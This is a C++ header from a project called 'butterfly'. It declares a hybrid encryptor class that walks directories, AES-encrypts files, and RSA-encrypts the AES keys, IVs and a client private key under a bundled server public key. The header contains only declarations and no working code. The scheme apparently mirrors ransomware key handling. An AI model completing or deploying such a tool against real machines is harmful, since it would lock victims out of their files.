
#ifndef BUTTERFLY_ENCRYPTOR_H
#define BUTTERFLY_ENCRYPTOR_H

#include "crypto/rsaEncryptor.h"
#include "crypto/aesEncryptor.h"
#include "crypto/serverPublicKey.h"
#include "directoryIterator.h"
#include "aesKeyDatabase.h"
#include "params.h"

namespace butterfly
{

namespace hybrid
{

/**
 * Class Encryptor to encrypt the AES and the CPrivateRSA key
 */
class Encryptor
{

private:
    int _keySize;
    std::string _aesKeyDbFilepath;
    std::unique_ptr<rsa::RSAEncryptor> _rsaEncryptorAESKey, _rsaEncryptorAESIV, _rsaEncryptorCPrivateRSA;
    std::unique_ptr<aes::AESEncryptor> _aesEncryptor;
    std::unique_ptr<DirectoryIterator> _dirIterator;
    std::unique_ptr<AESKeyDatabase> _aesKeyDatabase;

public:
    /**
     * Constructor Encryptor
     */
    explicit Encryptor(int keySize = 2048, const std::string &aesKeyDbFilepath = "/home/christian/projects/butterfly/bin/AES.db");

    /**
     * Destructor Encryptor
     */
    ~Encryptor();

    /**
     *
     * @param path
     */
    void startWithDir(const std::string &path);

    /**
     * Encrypts the CPrivateRSA.pem and saves the bin file on the host machine
     */
    void encryptCPrivateRSA();

    /**
     *
     * @param filepath
     */
    void encryptFileWithAES(const std::string &filepath);

    /**
     *
     * @param data
     * @param filename
     */
    void encryptFinalAESKeyWithRSA(const std::string &data, const std::string &filename);

    /**
     *
     * @param data
     * @param filename
     */
    void encryptFinalAESIVWithRSA(const std::string &data, const std::string &filename);
    void encryptAESKeyFile(const std::string &filepath);
};

} // namespace hybrid

} // namespace butterfly

#endif //BUTTERFLY_ENCRYPTOR_H
